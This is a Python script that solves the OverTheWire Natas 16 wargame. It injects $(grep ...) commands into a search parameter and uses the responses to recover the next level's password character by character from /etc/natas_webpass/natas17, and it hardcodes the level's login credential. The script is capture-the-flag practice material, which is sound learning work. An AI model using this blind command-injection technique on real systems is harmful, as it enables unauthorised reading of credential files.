# Vulnerability: Command Injection

import requests
import string
import colorama
from colorama import Fore, Style


# Function to check the content of the response
def responseContentChecker(resp, char):
    if "African" not in resp.text:
        passwordList.append(char)
        return True
    else:
        return False


# Function to brute force the password using character list
def password_bruteforce(passwordList, charList):
    for char in charList:

        # This If will only run once because the password list empty at the beginning.
        if len(passwordList) == 0:
            needle = f"$(grep ^{char} /etc/natas_webpass/natas17)"
        else:
            # Append the new character to the list of valid characters
            needle = f"$(grep ^{''.join(passwordList) + char} /etc/natas_webpass/natas17)"

        params = {"needle": needle, "submit": "search"}
        resp = session.get(url=url, params=params)

        if responseContentChecker(resp, char):
            break
    print(f"[+] Password List: {passwordList}")


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Create a session and set the authorization credentials
session = requests.Session()


# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)


# Alphanumeric characters list
charList = string.ascii_letters + string.digits


# Empty Password List
passwordList = []


for i in range(len(password)):
    # Simple print statement to track the progress
    print(f"\n[-] Brute forcing {i + 1} character...")
    password_bruteforce(passwordList, charList)


print(f"\nNatas 17: {''.join(passwordList)}")
